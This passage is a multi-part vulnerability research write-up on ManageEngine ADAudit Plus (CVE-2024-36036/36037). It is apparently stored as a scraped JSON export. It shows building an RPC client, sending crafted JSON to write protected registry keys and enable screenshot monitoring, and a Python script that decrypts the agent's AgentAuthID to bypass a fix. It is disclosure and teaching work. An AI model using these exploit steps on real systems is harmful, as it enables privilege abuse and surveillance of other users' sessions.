__RPC_USER midl_user_free(void __RPC_FAR * ptr) { free(ptr); } The first modification we need to do is to replace the filename on line 1 and line 5 #include \u0026quot;hello.h\u0026quot; to #include \u0026quot;ADAPAgentRpcPipe_h.h\u0026quot; as we have compiled our own header file created via the IDL file. In addition to we add a line with #pragma comment(lib, rpcrt4.lib\u0026quot;) to be able to create RPC bindings.\nThe result:\n- /* file: helloc.c */ #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; - #include \u0026#34;hello.h\u0026#34; #include \u0026lt;windows.h\u0026gt; + /* file: adauditrpc-client.cpp */ #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; + #include \u0026#34;ADAPAgentRpcPipe_h.h\u0026#34; #include \u0026lt;windows.h\u0026gt; + #pragma comment(lib, \u0026#34;rpcrt4.lib\u0026#34;) Next step is to replace some data types and initiate variables to be used for the RPC bindings. These can be found on lines 12-19.\nRPC_STATUS status; - unsigned char * pszUuid = NULL; - unsigned char * pszProtocolSequence = \u0026#34;ncacn_np\u0026#34;; - unsigned char * pszNetworkAddress = NULL; - unsigned char * pszEndpoint = \u0026#34;\\\\pipe\\\\hello\u0026#34;; - unsigned char * pszOptions = NULL; - unsigned char * pszStringBinding = NULL; - unsigned char * pszString = \u0026#34;hello, world\u0026#34;; unsigned long ulCode; RPC_STATUS status; + RPC_WSTR pszUuid = NULL; + RPC_WSTR pszProtocolSequence = (RPC_WSTR)L\u0026#34;ncacn_np\u0026#34;; + RPC_WSTR pszNetworkAddress = (RPC_WSTR)L\u0026#34;100.64.5.212\u0026#34;; // Target ADAudit agent + RPC_WSTR pszEndpoint = (RPC_WSTR)L\u0026#34;\\\\pipe\\\\ADAPAgentRpcPipe\u0026#34;; + RPC_WSTR pszOptions = NULL; + RPC_WSTR pszStringBinding = NULL; + //unsigned char * pszString = \u0026#34;hello, world\u0026#34;; unsigned long ulCode; At line 29 we replace:\n- status = RpcBindingFromStringBinding(pszStringBinding, \u0026amp;hello_ClientIfHandle); + status = RpcBindingFromStringBinding(pszStringBinding, \u0026amp;DefaultIfName_v1_0_c_ifspec); And line 49:\n- status = RpcBindingFree(\u0026amp;hello_IfHandle); + status = RpcBindingFree(\u0026amp;DefaultIfName_v1_0_c_ifspec); The \u0026amp;DefaultIfName_v1_0_c_ifspec parameter is defined in the header file from our IDL compilation as we named our RPC interface DefaultIfName (Line 5 in ADAPAgentRpcPipe.idl).\nThe last step would be to call the correct procedures as stated in our IDL: Proc0, Proc1 or Proc2. At this point in time we have no clue what the procedures do when they are triggered on the agent side but we aim to find out.\nAt line 34 and 35 Microsoft\u0026rsquo;s example code calls the example procedures HelloProc() and Shutdown(). We will continue with replacing these with Proc0 and provide valid arguments to test our first ADAuditAgentRpcPipe procedure.\nBy reviewing our IDL structure for Proc0 we also know that the procedure takes two argument:\narg_0 with datatype long which is an integer datatype and arg_1 with datatype long* which is a pointer to a long. arg_1 is defined with [in][out] meaning that this may be output from the application.\nAs our IDL header structure lacks an implicit handle we need to provide a handle (\u0026amp;DefaultIfName_v1_0_c_ifspec) to Proc0, we\u0026rsquo;ll also instantiate variables for arg_0 and arg_1:\n- RpcTryExcept - { - HelloProc(pszString); - Shutdown(); - } + long arg_0 = 0; + long arg1_pointer; + long* arg_1 = \u0026amp;arg1_pointer; + RpcTryExcept + { + Proc0(DefaultIfName_v1_0_c_ifspec, arg_0, arg_1); + } In order for Visual Studio to reference DefaultIfName_v1_0_c_ifspec, we need to include the ADAPAgentRpcPipe_c.c file in our list of source files:\nAlso add the ADAPAgentRpcPipe_h.h file under Header Files.\nThe final project structure in Visual Studio should now look loo this:\nAnd if every step is followed correctly the project should now build. Voilà\u0026hellip;\nBut does it actually work?\nRunning the binary from the command line does not print any output unless an exception is thrown but if the network traffic is analyzed with Wireshark we can see similar traffic to when the RPC interaction was triggered by the ADAudit web application.\nO.. M.. G.. it seems to work!\nSummary In this part of the research we successfully created a working RPC client to interact with the ADAudit Agent. But we still don\u0026rsquo;t know what either Proc0, Proc1 or Proc2 does. In part 2, we dig into reverse engineering of the agent software in an attempt to find out what we actually can do with our newly created client.\nSupport us by following our LinkedIn page and get notified when new research is published: https://www.linkedin.com/company/shelltrail\nFollow this URL to read part 2: https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part2/\n","date":1716768000,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1716768000,"objectID":"6f1a18b6938e273900866aab5415d2ec","permalink":"https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part1/","publishdate":"2024-05-27T00:00:00Z","relpermalink":"/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part1/","section":"research","summary":"Follow along a journey to find vulnerabilities in the RPC functionaliy of ManageEngine ADAudit","tags":null,"title":"ManageEngine ADAudit - Reverse engineering Windows RPC to find CVEs - part 1 / RPC","type":"research"},{"authors":null,"categories":null,"content":"Reverse engineering ADAPAgent.exe So if you followed the part 1 of this research we got a fully working RPC client to interact with the ADAudit Agent. Nice.\nWe still have alot to accomplish to reach some kind of goal:\nCreate a valid IDL structure Brew a large can of coffee Build a RPC client Guess a lot Create input data that will be marshalled into a valid stub that server will act on. When testing the custom adauditrpc-client from different authentication context\u0026rsquo;s it was determined that only Domain Users permission was needed to connect to the RPC interface over the network. The reason for this is because the ADAudit Agent RPC server is configured with a ncacn_np interface. And this interface requires binding of the named pipe over SMB in order to negotiate which port the forthcoming network communication should rely on. And because Domain Users by default can communication with SMB on adjacent servers and computers, this satisfies the RPC authentication part of ManageEngine\u0026rsquo;s ADAuditAgent.\nApart from this, there are no additional access control lists applied to the named pipe:\nIf the custom adauditrpc-client is executed on the local host in a low-privileged session \u0026ldquo;no\u0026rdquo; authentication is required as Windows automatically forwards the current authenticated session.\nFor the last steps on our to do-list we need to dig a bit deeper:\nCreate input data that will be marshalled into a valid stub that the server will act on. Now we need to figure out which input data we can send and how the AD Audit Agent will behave based on the various input. Luckily we can turn to logs on the target machine and hopefully find more information how this agent works.\nAfter searching through all files on the target Windows machine at C:\\Program Files\\ManageEngine\\ADAuditPlusAgent\\ we can observe that running the RPC client generates a log entry similar to this:\n\u0026gt; Get-Content \u0026#39;C:\\Program Files\\ManageEngine\\ADAuditPlusAgent\\Logs\\MessengerLog_2023_12_01.txt\u0026#39; -Tail 1 [2023-12-01 18:47:17,663] [9][INFO ][Messenger] : Change Notification from ADAP Server, ID : 0 So now we know that we trigger some kind of Change Notification.\nWe also know from the RpcView.exe output that the RPC named pipe is exposed via a binary called ADAPAgent.exe.\nBy running the following PowerShell command we determine that the binary is a .NET assembly:\n\u0026gt; [System.Reflection.AssemblyName]::GetAssemblyName(\u0026#39;C:\\Program Files\\ManageEngine\\ADAuditPlusAgent\\bin\\ADAPAgent.exe\u0026#39;) Version Name ------- ---- 6.0.0.0 ADAPAgent Now we are riding on a shrimp sandwitch (thanks for the Swedish translation @fransrosen :) ). .NET assemblies can much like Jar-files be decompiled into human readable code. This means that we won\u0026rsquo;t need to dig into low-level language such as assembly, pseudo code or similar.\nAfter downloading and extracting dnSpy we open ADAPAgent.exe and start our investigation.\nQuite quickly we notice the RPCHandler class with the NotifyAgent function.\nComparing this disassembled function from ADAPAgent.exe with our IDL structure, we can assume the following:\nGuess a lot As seen in the code from the NotifyAgent function it was quite boring:\nprivate static int NotifyAgent(int notifyId) { Logger.Msgr.InfoFormat(\u0026#34;Change Notification from ADAP Server, ID : {0}\u0026#34;, notifyId); return 0; } It only logs the parameter notifyId.\nLooking into the next function however, NofifyAgentStr contains alot more interesting functionality:\n// Agent.RPC.RPCHandler // Token: 0x06000129 RID: 297 RVA: 0x00008D04 File Offset: 0x00006F04 private static int NotifyAgentStr(int notifyId, string msgStr) { int errStatus = 1; try { Hashtable msgMap = JsonAPI.JsonToHashtable(msgStr); if (msgMap.ContainsKey(\u0026#34;AgentUID\u0026#34;) \u0026amp;\u0026amp; DataStore.Get(\u0026#34;AgentUID\u0026#34;).ToString().Equals(msgMap[\u0026#34;AgentUID\u0026#34;].ToString())) { errStatus = 0; JObject json = JObject.Parse(msgStr); json.Remove(\u0026#34;AgentUID\u0026#34;); json.Remove(\u0026#34;ADAP_SERVER_DNS_NAME\u0026#34;); string jsonMsgStr = JsonAPI.ObjectToJsonString(json); switch (notifyId) { case 0: DataStore.Update(jsonMsgStr); goto IL_24F; case 1: if (!ExcludeConfManager.getInstance.UpdateConf(jsonMsgStr)) { Logger.Config.InfoFormat(\u0026#34;Exclude configuration updation failed \\n{0}\u0026#34;, msgStr); goto IL_24F; } goto IL_24F; case 2: { bool flag = ScheduleManager.updateSceduleConf(jsonMsgStr); RPCHandler.isScheduleXmlUpdated = false; if (flag) { RPCHandler.isScheduleXmlUpdated = true; goto IL_24F; } Logger.Config.InfoFormat(\u0026#34;Schedule configuration updation failed \\n{0} \u0026#34;, msgStr); goto IL_24F; } case 3: if (!EventParserManager.getInstance.UpdateConf(jsonMsgStr)) { Logger.Config.InfoFormat(\u0026#34;Parser configuration updation failed \\n{0} \u0026#34;, msgStr); goto IL_24F; } goto IL_24F; case 4: Logger.Config.InfoFormat(\u0026#34;Protocol Configuration is (From ADAP server) : \\n{0}\u0026#34;, msgStr); DataStore.Update(jsonMsgStr); goto IL_24F; case 7: new Thread(delegate() { DataStore.SendTestPacket(); }).Start(); Logger.Config.InfoFormat(\u0026#34;Test pockets send to ADAP server thread started\u0026#34;, new object[0]); goto IL_24F; case 8: { bool enableDebug = false; if (msgMap.ContainsKey(\u0026#34;ENABLE_DEBUG\u0026#34;)) { enableDebug = (bool)msgMap[\u0026#34;ENABLE_DEBUG\u0026#34;]; } Logger.enableDisableDebugLevel(enableDebug); goto IL_24F; } case 9: DataStore.Update(jsonMsgStr); goto IL_24F; case 10: Logger.Event.InfoFormat(\u0026#34;Request from ADAP server to run schedule immediately\u0026#34;, new object[0]); new Scheduler().runEventScheduler(); goto IL_24F; case 11: { JArray shareArray = json[\u0026#34;SHARES\u0026#34;] as JArray; new Thread(delegate() { ShareFinalPathName.getFinalPathName(shareArray); }).Start(); goto IL_24F; } } Logger.Msgr.ErrorFormat(\u0026#34;NotifyAgentStr :: Invalid notification Id : \\n{0}\u0026#34;, notifyId); } else { Logger.Msgr.ErrorFormat(\u0026#34;synced from unknown server : ServerName :: {0}\u0026#34;, msgMap[\u0026#34;ADAP_SERVER_DNS_NAME\u0026#34;]); } IL_24F:; } catch (Exception ex) { Logger.Msgr.ErrorFormat(\u0026#34;EXCEPTION :: RPCHandler.NotifyAgentStr : {0}\u0026#34;, ex); errStatus = 1; } return errStatus; } Lets see if the private static int NotifyAgentStr(int notifyId, string msgStr) maps to either Proc1 or Proc2 in our IDL:\nProc1 requires a long (integer) as arg_0. Check\nProc1 requires a wchar_t (string) as arg_1. Check\nOh yes. Proc1 is likely mapped to the NotifyAgentStr function in ADAP.exe\nLets update the custom adauditrpc-client created in part 1:\n- long arg_0 = 0; - long arg1_pointer; - long* arg_1 = \u0026amp;arg1_pointer; - RpcTryExcept - { - Proc0(DefaultIfName_v1_0_c_ifspec, arg_0, arg_1); - } + long arg_0 = 0; + wchar_t arg_1[] = L\u0026#34;snus\u0026#34;; + long arg2_pointer; + long* arg_2 = \u0026amp;arg2_pointer; + RpcTryExcept + { + Proc1(DefaultIfName_v1_0_c_ifspec, arg_0, arg_1, arg_2); + } Rebuild the solution and the execute the binary and check the logs. Boom. We are in the NotifyAgentStr.\n\u0026gt; Get-Content \u0026#39;C:\\Program Files\\ManageEngine\\ADAuditPlusAgent\\Logs\\MessengerLog_2023_12_01.txt\u0026#39; -Tail 10 [2023-12-01 19:41:03,834] [11][INFO ][Messenger] : NATV.FA_NotifyAgentStr :: notification from ADAP server, notifyId : 0 [2023-12-01 19:41:03,849] [11][ERROR][Messenger] : EXCEPTION :: RPCHandler.NotifyAgentStr : Newtonsoft.Json.JsonReaderException: Unexpected character encountered while parsing value: s. Path \u0026#39;\u0026#39;, line 0, position 0. at Newtonsoft.Json.JsonTextReader.ParseValue() at Newtonsoft.Json.JsonTextReader.Read() at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.ReadForType(JsonReader reader, JsonContract contract, Boolean hasConverter) at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.Deserialize(JsonReader reader, Type objectType, Boolean checkAdditionalContent) at Newtonsoft.Json.JsonSerializer.DeserializeInternal(JsonReader reader, Type objectType) at Newtonsoft.Json.JsonConvert.DeserializeObject(String value, Type type, JsonSerializerSettings settings) at Newtonsoft.Json.JsonConvert.DeserializeObject[T](String value, JsonSerializerSettings settings) at Agent.RPC.RPCHandler.NotifyAgentStr(Int32 notifyId, String msgStr) in d:\\Webhost\\30-12-2021\\WindowsBuilds\\ADAUDITPLUS_GIT\\4649300\\ftpagent64\\ADAP_SRC\\source\\agent\\core\\ADAPAgent\\ADAPAgent\\RPC\\RPCHandler.cs:line 118 The result is a JSON parsing error meaning that the agent is probably expecting JSON input. What we also notice from the agent code is that we have an if statement (line 2) that compares a JSON key named AgentUID with a value fetched by DataStore.Get().\nHashtable msgMap = JsonAPI.JsonToHashtable(msgStr); if (msgMap.ContainsKey(\u0026#34;AgentUID\u0026#34;) \u0026amp;\u0026amp; DataStore.Get(\u0026#34;AgentUID\u0026#34;).ToString().Equals(msgMap[\u0026#34;AgentUID\u0026#34;].ToString())) { errStatus = 0; JObject json = JObject.Parse(msgStr); json.Remove(\u0026#34;AgentUID\u0026#34;); json.Remove(\u0026#34;ADAP_SERVER_DNS_NAME\u0026#34;); string jsonMsgStr = JsonAPI.ObjectToJsonString(json); switch (notifyId) { case 0: DataStore.Update(jsonMsgStr); goto IL_24F; [...] The DataStore.Get() seems to fetch data from the Windows Registry:\nAt this location in the Windows registry the AgentUID is stored:\nWhat this information tells us is that we cannot successfully communicate with the ADAudit Agent over the network as we do not know the AgentUID. If we fail to match the AgentUID we fall into to else statement which skips over all the fun cases:\nelse { Logger.Msgr.ErrorFormat(\u0026#34;synced from unknown server : ServerName :: {0}\u0026#34;, msgMap[\u0026#34;ADAP_SERVER_DNS_NAME\u0026#34;]); } However, we are allowed to read registry item from a low-privileged session on the machine, meaning that we still can turn this something that we have into a local attack.\n\u0026gt; (Get-ItemProperty -Path \u0026#34;HKLM:\\SOFTWARE\\ManageEngine\\ADAP\u0026#34; -Name AgentUID).AgentUID 1699964702085 Lets see if case 0: is reachable if a correct AgentUID is provided:\n- long arg_0 = 0; - wchar_t arg_1[] = L\u0026#34;snus\u0026#34;; - long arg2_pointer; + long arg_0 = 0; + wchar_t arg_1[] = L\u0026#34;{\\\u0026#34;AgentUID\\\u0026#34;:\\\u0026#34;1699964702085\\\u0026#34;,\\\u0026#34;snus\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}\u0026#34;; + long arg2_pointer; Build, execute, check the logs:\n\u0026gt; Get-Content \u0026#39;C:\\Program Files\\ManageEngine\\ADAuditPlusAgent\\Logs\\MessengerLog_2023_12_01.txt\u0026#39; -Tail 1 [10][INFO ][Messenger] : NATV.FA_NotifyAgentStr :: notification from ADAP server, notifyId : 0 ... Look successful. But what happened? Search through all logs..\n\u0026gt; Get-ChildItem \u0026#39;C:\\Program Files\\ManageEngine\\ADAuditPlusAgent\\Logs\\*\u0026#39; | Select-String snus AgentLog_2023_12_01.txt:103:[2023-12-01 20:14:55,884] [10][INFO ][Default] : Set Registry Key: HKEY_LOCAL_MACHINE\\SOFTWARE\\ManageEngine\\ADAP\\snus = true ... Now we are getting somewhere. We have the ability to write arbitrary registry entries in the HKEY_LOCAL_MACHINE\\SOFTWARE\\ManageEngine\\ADAP location which should only be writable by high-privileged users. And we can do this from a local low-privileged user. Very nice.\n\u0026lt;insert celebration dance and get more coffee\u0026gt;\nCreate a valid IDL structure Brew a large can of coffee Build a RPC client Guess a lot Create input data that will be marshalled into a valid stub that server will act on. The last step is now completed on the initial to do-list. But more reversing is needed to reach our en goal. Remember the SessionMonitoring feature which was the targetted functionality?\nSessionMonitoring seems to be enabled by the registry item SMStatus in HKEY_LOCAL_MACHINE\\SOFTWARE\\ManageEngine\\ADAP\\SessionMonitoring\nBy reviewing the decompiled code of the ADAPAgent.exe function DataStore we notice that if we input SMData as a JSON key we can reach DataStore.UpdateSMDetails which looks promising.\nLet\u0026rsquo;s update our custom ADAuditAgentRPC client POC with a nested JSON object such as:\n{ \u0026#34;AgentUID\u0026#34;:\u0026#34;1699964702085\u0026#34;, \u0026#34;SMData\u0026#34;:{ \u0026#34;SMStatus\u0026#34;:\u0026#34;True\u0026#34; } } - wchar_t arg_1[] = L\u0026#34;{\\\u0026#34;AgentUID\\\u0026#34;:\\\u0026#34;1699964702085\\\u0026#34;,\\\u0026#34;snus\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}\u0026#34;; + wchar_t arg_1[] = L\u0026#34;{\\\u0026#34;AgentUID\\\u0026#34;:\\\u0026#34;1699964702085\\\u0026#34;,\\\u0026#34;SMData\\\u0026#34;:{\\\u0026#34;SMStatus\\\u0026#34;:\\\u0026#34;True\\\u0026#34;}}\u0026#34;; Build, execute, check the logs:\n\u0026gt; Get-Content \u0026#39;C:\\Program Files\\ManageEngine\\ADAuditPlusAgent\\Logs\\AgentLog_2023_12_02.txt\u0026#39; | Select-String SMSTatus [2023-12-02 10:28:29,988] [9][INFO ][Default] : Set Registry Key: HKEY_LOCAL_MACHINE\\SOFTWARE\\ManageEngine\\ADAP\\SessionMonitoring\\SMStatus = True ... Great success!\nSummary So what we actually managed to do is to enable the SessionMonitoring feature from a local low privileged user. When this feature is enabled and when a user logs into the machine screenshots will be taken with 1 seconds interval and stored in the directory C:\\ProgramData\\ManageEngine\\ADAuditPlus Agent\\SessionMonitoring. This directory is readable by all local users and enables an attacker to monitor other sessions.\nIn addition all configuration parameter stored in the registry at HKEY_LOCAL_MACHINE\\SOFTWARE\\ManageEngine\\ADAP is under the attackers control.\nPOC:\nYour browser does not support the video tag. The permissive folder permission allowing all users to view the screenshots was assigned CVE-2024-36037 and was fixed in Build 7270 (Dec 29, 2023)\nFixes\nA few changes focused on hardening the security of agent data have been implemented.\nHowever, one crucial part regarding the ADAudit Agent RPC client was overseen. Remember the first sentence in part 1:\n\u0026ldquo;The objective when this research started was actually to find a new way to leverage an old CVE\u0026rdquo;\n\u0026hellip; We are not using the latest version.\nContinue reading part 3 to find out which mitigation that was already in place, preventing exploitation of the RPC security issue, and how it was bypassed.\nPart 3: https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part3/\nOr if you missed part 1: https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part1/\n","date":1716768000,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1716768000,"objectID":"a043c7fdc105fb089d77e37d375c4be1","permalink":"https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part2/","publishdate":"2024-05-27T00:00:00Z","relpermalink":"/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part2/","section":"research","summary":"Part 2 of the ManageEngine ADAudit research focuses on reverse engineering the ADAudit Agent to provide proper input data for the previously built custom RPC client","tags":null,"title":"ManageEngine ADAudit - Reverse engineering Windows RPC to find CVEs - part 2 / reverse engineering","type":"research"},{"authors":null,"categories":null,"content":"Background If you followed along part 1 and part 2 of this research you know that we built a custom adauditrpc-client and then reverse engineered the agent to successfully use it to make configuration changes on the host system of the agent.\nThe requirement for this custom RPC client to successfully authenticate was:\nAuthenticated remote SMB or local access to the named pipe exposed by the agent. AgentUID stored in the registry hive. When this vulnerability was about to be reported to the team at ManageEngine a small detail was discovered:\n- \u0026ldquo;We are not using the latest version\u0026rdquo;\nSo the ADAudit Plus server used in this research was upgraded from 7050 to 7251 as well as the ADAudit Agent and hope was placed that the POC should work even on the latest version. It did not.\nSecurity mitigation To figure out what was wrong with our custom RPC client we decompiled the ADAPAgent.exe once again with dnSpy to see if anything had changed between the versions.\nWe start by analyzing the NotifyAgentStr function that was called via the custom adauditrpc-client. Interesting, a new value is being checked:\nprivate static int NotifyAgentStr(int notifyId, string msgStr) { int errStatus = 1; try { Hashtable msgMap = JsonAPI.JsonToHashtable(msgStr); -\tif (msgMap.ContainsKey(\u0026#34;AgentUID\u0026#34;) \u0026amp;\u0026amp; DataStore.Get(\u0026#34;AgentUID\u0026#34;).ToString().Equals(msgMap[\u0026#34;AgentUID\u0026#34;].ToString())) +\tif (msgMap.ContainsKey(\u0026#34;AgentAuthID\u0026#34;) \u0026amp;\u0026amp; string.Equals(DataStore.Get(\u0026#34;AgentAuthID\u0026#34;).ToString(), msgMap[\u0026#34;AgentAuthID\u0026#34;].ToString(), StringComparison.CurrentCultureIgnoreCase)) { errStatus = 0; [...] The value AgentUID that we previously used as authentication is now replaced with AgentAuthID. Lets check this out in the registry:\nIt is a long value and as it does not match any known hash, it\u0026rsquo;s likely encrypted:\nuser@adpen1:~$ hash-identifier HASH: MzZc42XU0S9wd1QqDhxZf7djz3laBswMY57K5H0aMclEYWnS+iAy6wsnKuF31TYKNw8Lk1D3ijxqEcVcDaMG3SBtBJU7/KX/EyVs9H//Q+XZn/OGkNcW4Of7b8mNXHKI0N0a Not Found. base64 decode piping to xxd does not give any more clues:\nuser@adpen1:~$ echo -n MzZc42XU0S9wd1QqDhxZf7djz3laBswMY57K5H0aMclEYWnS+iAy6wsnKuF31TYKNw8Lk1D3ijxqEcVcDaMG3SBtBJU7/KX/EyVs9H//Q+XZn/OGkNcW4Of7b8mNXHKI0N0a | base64 -d | xxd 00000000: 3336 5ce3 65d4 d12f 7077 542a 0e1c 597f 36\\.e../pwT*..Y. 00000010: b763 cf79 5a06 cc0c 639e cae4 7d1a 31c9 .c.yZ...c...}.1. 00000020: 4461 69d2 fa20 32eb 0b27 2ae1 77d5 360a Dai.. 2..\u0026#39;*.w.6. 00000030: 370f 0b93 50f7 8a3c 6a11 c55c 0da3 06dd 7...P..\u0026lt;j..\\.... 00000040: 206d 0495 3bfc a5ff 1325 6cf4 7fff 43e5 m..;....%l...C. 00000050: d99f f386 90d7 16e0 e7fb 6fc9 8d5c 7288 ..........o..\\r. 00000060: d0dd 1a ... Lets continue reviewing the ADAPAgent.exe source code. If we follow the DataStore.Get() function we can see at line 459 that the Cryptography.Decrypt() is called.\nThis looks fun:\n1: // Agent.Common.Helpers.Cryptography 2: // Token: 0x060002A0 RID: 672 RVA: 0x00019E3C File Offset: 0x0001803C 3: public static string Decrypt(string cipherStr) 4: { 5: string output = null; 6: try 7: { 8:\tif (string.IsNullOrEmpty(cipherStr) || cipherStr.Length \u0026lt; 32) 9:\t{ 10:\tLogger.Event.InfoFormat(\u0026#34;String cannot be Decrypted\u0026#34;, new object[0]); 11:\treturn output; 12:\t} 13:\tbyte[] cipherText = Convert.FromBase64String(cipherStr); 14:\tbyte terminateByte = 92; 15:\tint plainTextIndex = Array.IndexOf\u0026lt;byte\u0026gt;(cipherText, terminateByte); 16:\tint plainTextLength = int.Parse(Encoding.ASCII.GetString(cipherText.Take(plainTextIndex).ToArray\u0026lt;byte\u0026gt;())); 17:\tplainTextLength += 16 - plainTextLength % 16; 18:\tplainTextIndex++; 19:\tusing (Aes aes = Aes.Create()) 20:\t{ 21:\taes.Key = cipherText.Skip(plainTextIndex).Take(32).ToArray\u0026lt;byte\u0026gt;(); 22:\taes.IV = cipherText.Skip(32 + plainTextIndex).Take(16).ToArray\u0026lt;byte\u0026gt;(); 23:\tcipherText = cipherText.Skip(48 + plainTextIndex).Take(plainTextLength).ToArray\u0026lt;byte\u0026gt;(); 24:\tAes aes2 = aes; 25:\tbyte[] plainTextBytes = aes2.CreateDecryptor(aes2.Key, aes.IV).TransformFinalBlock(cipherText, 0, cipherText.Length); 26:\toutput = Encoding.UTF8.GetString(plainTextBytes); 27:\t} 28: } 29:\tcatch (Exception ex) 30: { 31:\tLogger.Event.ErrorFormat(\u0026#34;Exception in Decrypt: \u0026#34; + ex.Message, new object[0]); 32:\treturn null; 33:\t} 34:\treturn output; 35: } Lets break down the code:\nLine 13 takes the cipherStr (aka AgentAuthID) and base64 decodes it.\n13:\tbyte[] cipherText = Convert.FromBase64String(cipherStr); Line 14 creates a terminateByte variable where 92 in decimal ascii represents \\ or \\x5c in hex.\n14:\tbyte terminateByte = 92; Line 15 creates an int named plainTextIndex. This code excerpt finds the position of the first occurring \\\n15:\tint plainTextIndex = Array.IndexOf\u0026lt;byte\u0026gt;(cipherText, terminateByte); Line 16 creates an int named plainTextLength which contains the string in our cipherStr up to the first \\.\n16:\tint plainTextLength = int.Parse(Encoding.ASCII.GetString(cipherText.Take(plainTextIndex).ToArray\u0026lt;byte\u0026gt;())); This is actually sane if you remember our xxd output. Could our plainText be 36 charachters long?:\nuser@adpen1:~$ echo -n MzZ[...]N0a | base64 -d | xxd 00000000: 3336 5ce3 65d4 d12f 7077 542a 0e1c 597f 36\\.e../pwT*..Y. 00000010: b763 cf79 5a06 cc0c 639e cae4 7d1a 31c9 .c.yZ...c...}.1. 00000020: 4461 69d2 fa20 32eb 0b27 2ae1 77d5 360a Dai.. 2..\u0026#39;*.w.6. 00000030: 370f 0b93 50f7 8a3c 6a11 c55c 0da3 06dd 7...P..\u0026lt;j..\\.... 00000040: 206d 0495 3bfc a5ff 1325 6cf4 7fff 43e5 m..;....%l...C. 00000050: d99f f386 90d7 16e0 e7fb 6fc9 8d5c 7288 ..........o..\\r. 00000060: d0dd 1a ... Line 17 increases to our plainTextLength to ensure that the length of the int is a multiple of 16 bytes, which is a requirement for the AES block cipher.\n17:\tplainTextLength += 16 - plainTextLength % 16; Line 18 adds 1 to our plainTextIndex to point at the first byte after \\\n18:\tplainTextIndex++; Line 19-27 is the decryption process:\nLine 21 create an AES key with bytes stored at plainTextIndex (3) + 32 bytes\n21:\taes.Key = cipherText.Skip(plainTextIndex).Take(32).ToArray\u0026lt;byte\u0026gt;(); This can be recreated in bash by, base64 decode the AgentAuthID and pipe it to xxd. -s 3 to set starting byte at 3, -l 32 to stop after 32 bytes and finally -c 200 to disable output formatting. The output should be our AES key.\nuser@adpen1:~$ echo -n MzZ[...]N0a | base64 -d | xxd -s 3 -l 32 -c 200 00000003: e365 d4d1 2f70 7754 2a0e 1c59 7fb7 63cf 795a 06cc 0c63 9eca e47d 1a31 c944 6169 Line 22 creates an AES Initialization Vector (IV) from the bytes stored at (32+3) + 16\n22:\taes.IV = cipherText.Skip(32 + plainTextIndex).Take(16).ToArray\u0026lt;byte\u0026gt;(); user@adpen1:~$ echo -n MzZ[...]N0a | base64 -d | xxd -s 35 -l 16 -c 200 00000023: d2fa 2032 eb0b 272a e177 d536 0a37 0f0b Line 23 fetches the cipherText from our AgentAuthID at byte (48+3) until plainTextLength (36)\n23:\tcipherText = cipherText.Skip(48 + plainTextIndex).Take(plainTextLength).ToArray\u0026lt;byte\u0026gt;(); user@adpen1:~$ echo -n MzZ[...]N0a | base64 -d | xxd -s 51 -l 36 -c 200 00000033: 9350 f78a 3c6a 11c5 5c0d a306 dd20 6d04 953b fca5 ff13 256c f47f ff43 e5d9 9ff3 8690 d716 To summarize, the AgentAuthID that is stored in the Windows registry is a base64 blob, containing the length of the plaintext, the AES key, the Initialization Vector and the encrypted text. With this information we should be able to decrypt ciphertext.\nHere is a bash one-liner to extract our requirements:\nuser@adpen1:~$ bytes=$(echo -n MzZc42XU0S9wd1QqDhxZf7djz3laBswMY57K5H0aMclEYWnS+iAy6wsnKuF31TYKNw8Lk1D3ijxqEcVcDaMG3SBtBJU7/KX/EyVs9H//Q+XZn/OGkNcW4Of7b8mNXHKI0N0a | base64 -d | xxd -p -c 200) user@adpen1:~$ echo -e \u0026#34;Length: ${bytes:0:4}\\nKey: ${bytes:6:64}\\nIV: ${bytes:70:32}\\nciphertext: ${bytes:102:174}\u0026#34; Length: 3336 Key: e365d4d12f7077542a0e1c597fb763cf795a06cc0c639ecae47d1a31c9446169 IV: d2fa2032eb0b272ae177d5360a370f0b ciphertext: 9350f78a3c6a11c55c0da306dd206d04953bfca5ff13256cf47fff43e5d99ff38690d716e0e7fb6fc98d5c7288d0dd1a Note that the output above is in HEX string format. Meaning that Length: is two bytes which can be converted to ASCII:\nHEX String HEX DEC ASCII 33 0x33 51 3 36 0x36 54 6 Lets try to decrypt the ciphertext using python3:\nfrom Crypto.Cipher import AES # pip3 install pycryptodome key = bytes.fromhex(\u0026#34;e365d4d12f7077542a0e1c597fb763cf795a06cc0c639ecae47d1a31c9446169\u0026#34;) iv = bytes.fromhex(\u0026#34;d2fa2032eb0b272ae177d5360a370f0b\u0026#34;) ciphertext = bytes.fromhex(\u0026#34;9350f78a3c6a11c55c0da306dd206d04953bfca5ff13256cf47fff43e5d99ff38690d716e0e7fb6fc98d5c7288d0dd1a\u0026#34;) aes = AES.new(key, AES.MODE_CBC, iv) print(aes.decrypt(ciphertext).decode(\u0026#39;utf-8\u0026#39;)) user@adpen1:~$ python3 decrypt_agentauthid.py 75fdc297-acc9-4ddb-83da-313cd909f3d6 user@adpen1:~$ echo -n 75fdc297-acc9-4ddb-83da-313cd909f3d6 | wc -c 36 Very nice. We have UUID, and yes it was 36 characters long. We can test this as authentication when we communicate with the ADAudit Agent.\nOnce again we attempt to change the registry item SMStatus to \u0026ldquo;True\u0026rdquo; to enable the SessionMonitoring process, an action which should only be available to 